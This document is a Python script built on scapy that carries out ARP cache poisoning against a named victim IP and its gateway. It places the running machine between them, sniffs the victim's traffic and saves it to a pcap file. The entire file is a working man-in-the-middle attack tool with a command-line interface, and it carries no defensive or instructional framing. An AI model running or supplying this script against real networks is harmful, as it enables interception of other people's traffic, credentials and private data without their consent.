from scapy.all import *
import netifaces
import threading
import argparse
import sys

# Start poisoning the ARP cache on the network.
def do_poison(target_ip, target_mac, gateway_ip, gateway_mac, my_mac):
    # craft ARP reply to convince victim machine that we are the gateway
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwsrc = my_mac
    poison_target.hwdst = target_mac

    # craft ARP reply to convince gateway that we are the target IP
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwsrc = my_mac
    poison_gateway.hwdst = gateway_mac

    print("[!] Starting ARP poisoning. Hit CTRL-C to stop.")
    while True:
        try:
            if args.stop_threads:
                break
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            break
    reset_network(target_ip, target_mac, gateway_ip, gateway_mac)
    print('[!] ARP poison attack finished.')
    return

# resetting the network - back to normal
def reset_network(target_ip, target_mac, gateway_ip, gateway_mac):
    print('[!] Resetting network to previous state.')
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

# Getting MAC address from IP
def get_mac_address_by_arp(ip_address):
    # send ARP requests to gather MAC address of provided IP address
    responses, unanswered = arping(ip_address)
    # if responses are received, return the MAC address from the first response
    for s, r in responses:
        return r[Ether].src
    return None

# Getting MAC address belonging to the local Interface specified
def get_mac_address_by_interface(interface_name):
    return netifaces.ifaddresses(interface_name)[netifaces.AF_LINK][0]['addr']

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='ARP cache poisoner')
    parser.add_argument('-i', '--iface', required=True, help='Network interface to use')
    parser.add_argument('target_ip', help='Target (victim) IP address')
    parser.add_argument('-g', '--gateway', required=True, help='Default gateway of target subnet')
    parser.add_argument('-c', '--count', required=False, default=0,help='Number of packets to listen for (default is 0 for unlimited)')
    parser.add_argument('-o', '--output', required=True, help='Output file to write captured packets to')
    args = parser.parse_args()

    # arguments
    interface = args.iface
    target_ip = args.target_ip
    gateway_ip = args.gateway
    packet_count = int(args.count)
    output_file = args.output

    # threads
    args.stop_threads = False

    print('[+] Setting up {} interface.'.format(interface))

    # getting MAC from Interface
    my_mac = get_mac_address_by_interface(interface)
    print('[!] Obtaining MAC address for gateway IP {}.'.format(gateway_ip))

    # getting MAC from ARP
    gateway_mac = get_mac_address_by_arp(gateway_ip)
    if not gateway_mac:
        print('FATAL ERROR, unable to obtain default gateway MAC address.')
        sys.exit(100)

    # Getting MAC from target IP
    print('[!] Obtaining MAC address for target IP {}.'.format(target_ip))
    target_mac = get_mac_address_by_arp(target_ip)
    if not target_mac:
        print('FATAL ERROR, unable to obtain MAC address for target IP.')
        sys.exit(101)
    print('Gateway MAC: {}, Target MAC: {}'.format(gateway_mac, target_mac))

    # starting poisoning threads
    print('[!] Launching ARP poison thread.')
    poison_thread = threading.Thread(target=do_poison, args=(target_ip, target_mac, gateway_ip, gateway_mac, my_mac))
    poison_thread.start()

    print('[!] Starting to listen for hijacked packets.')
    packets = None
    try:
        filter = 'ip host {}'.format(target_ip)
        kwargs = {'filter': filter, 'iface': interface}
        if packet_count > 0:
            kwargs['count'] = packet_count
        packets = sniff(**kwargs)
    except KeyboardInterrupt:
        pass

    print('[!] Finished capturing packets. Stopping poison thread and resetting network..')
    args.stop_threads = True
    poison_thread.join()

    # generating pcap
    print('[!] Writing captured packets to file {}.'.format(output_file))
    if packets:
        wrpcap(output_file, packets)
